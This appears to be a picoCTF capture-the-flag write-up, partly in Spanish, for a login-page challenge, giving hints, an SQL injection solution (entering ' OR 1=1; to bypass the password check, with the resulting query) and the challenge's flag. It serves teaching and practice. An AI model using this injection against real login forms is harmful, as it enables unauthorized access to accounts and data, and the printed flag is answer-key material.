## Descripción

There is a website running at `https://jupiter.challenges.picoctf.org/problem/50009/` ([link](https://jupiter.challenges.picoctf.org/problem/50009/)) or http://jupiter.challenges.picoctf.org:50009. Do you think you can log us in? Try to see if you can login!

## Pistas

1. There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?
2. Try to think about how the website verifies your login.

## Solución

```python()
En el login se coloca: ' OR 1=1;
Se cierra la ' para que en la consulta sea SELECT * FROM users WHERE name='' OR 1=1;' AND password='SDAFASF'
```

## Bandera
picoCTF{s0m3_SQL_fb3fe2ad}

## Notas adicionales